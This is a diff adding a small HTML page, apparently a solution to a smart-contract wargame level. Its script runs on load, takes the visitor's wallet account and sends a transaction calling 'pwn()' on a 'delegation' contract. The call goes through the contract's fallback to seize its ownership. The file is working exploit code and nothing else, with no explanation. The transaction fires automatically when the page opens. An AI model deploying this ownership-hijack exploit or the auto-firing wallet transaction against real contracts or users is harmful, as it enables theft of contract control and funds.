@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script>
+      (async () => {
+        let ethAddr;
+        if (window.ethereum) {
+          window.web3 = new Web3(window.ethereum);
+          let conn = await window.ethereum.enable();
+          if (conn.length > 0) {
+            ethAddr = conn[0];
+          }
+        } else {
+          return;
+        }
+
+        const delegationContrAddr =
+          "0xfe5542d3cC8Af13C3a2107363c52b8BD5051a7A1";
+        const delegationContract = await new window.web3.eth.Contract(
+          [
+            {
+              inputs: [
+                {
+                  internalType: "address",
+                  name: "_delegateAddress",
+                  type: "address",
+                },
+              ],
+              stateMutability: "nonpayable",
+              type: "constructor",
+            },
+            {
+              stateMutability: "nonpayable",
+              type: "fallback",
+            },
+            {
+              inputs: [],
+              name: "owner",
+              outputs: [
+                {
+                  internalType: "address",
+                  name: "",
+                  type: "address",
+                },
+              ],
+              stateMutability: "view",
+              type: "function",
+            },
+          ],
+          delegationContrAddr
+        );
+
+        const params = {
+          from: ethAddr,
+          to: delegationContrAddr,
+          data: Web3.utils.sha3("pwn()"),
+        };
+
+        await window.web3.eth.sendTransaction(params);
+      })();
+    </script>
+  </body>
+</html>
